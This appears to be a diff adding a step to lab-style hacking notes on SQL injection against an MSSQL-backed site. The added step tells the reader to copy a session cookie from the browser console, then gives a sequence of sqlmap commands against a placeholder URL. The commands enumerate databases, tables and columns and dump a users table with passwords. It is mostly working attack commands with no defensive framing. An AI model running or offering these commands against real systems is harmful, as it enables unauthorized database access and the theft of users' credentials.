@@ -14,3 +14,26 @@ This will create a user account.
 Logging into the site using the new site: 
 username: john
 password: apple123
+
+2- Performing SQL injection Attack Against MSSQL to Extract Databases and Webshell using SQLMAP. 
+
+http://www.example.com
+
+User/ username
+pass/ password
+
+once you are logged into the website, view Profile tab, and make a note of the URL in the address var of the browser. Right Click anywhere on the webpage and click
+
+Inspect Element (Q) from the context menu. 
+Developer Tools apearks, click Console and type document.cookie and Enter. Select cookie value and right-click to copy. 
+
+From Kali Linux type:
+sqlmap -u "http://example.com/viewprofile.aspx?id=1" -cookie=<"cookie value which you copied"> --dbs 
+
+sqlmap -u "http://example.com/viewprofile.aspx?id=1" -cookie=<"cookie value which you copied"> -D movies --tables
+
+sqlmap -u "http://example.com/viewprofile.aspx?id=1" -cookie=<"cookie value which you copied"> -D movies -T users --columns
+
+sqlmap -u "http://example.com/viewprofile.aspx?id=1" -cookie=<"cookie value which you copied"> -D movies -T users --dump 
+
+Now: You have obtained a list of users with their passowrds. 
